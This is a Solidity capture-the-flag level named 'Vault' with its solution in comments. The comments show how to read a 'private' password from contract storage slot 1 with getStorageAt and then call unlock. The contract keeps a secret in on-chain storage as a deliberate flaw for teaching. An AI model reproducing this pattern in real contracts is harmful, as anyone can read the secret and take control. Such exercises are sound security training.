// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 8. VAULT
 * @dev Unlock the contract to beat the level.
 */

/*
A private variable is not private on-chain, and can be publicly accessed

1. Read the storage of the contract at index 1 to find the password
const password = await web3.eth.getStorageAt("0x5E0bc315bDe04a2E24E00335976dC823E6214213", 1) 

2. Call the unlock function with the password to complete the level
await contract.unlock(password);


🎉 Level completed! 🎉
*/

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
